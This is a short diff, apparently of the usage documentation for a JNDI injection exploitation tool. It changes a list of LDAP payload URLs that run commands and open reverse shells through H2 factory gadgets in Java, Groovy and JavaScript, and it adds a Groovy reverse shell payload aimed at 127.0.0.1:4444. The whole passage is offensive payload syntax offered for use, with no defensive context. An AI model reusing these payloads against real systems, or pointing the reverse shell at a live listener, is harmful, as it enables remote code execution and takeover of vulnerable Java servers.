@@ -255,8 +255,9 @@ ldap://127.0.0.1:1389/Factory/H2/Java/Command/open -a Calculator
 ldap://127.0.0.1:1389/Factory/H2/Groovy/Command/open -a Calculator
 ldap://127.0.0.1:1389/Factory/H2/JavaScript/Command/open -a Calculator
 
-# native reverse shell (not support Groovy yet)
+# native reverse shell
 ldap://127.0.0.1:1389/Factory/H2/Java/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Factory/H2/Groovy/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Factory/H2/JavaScript/ReverseShell/127.0.0.1/4444
 ```
 
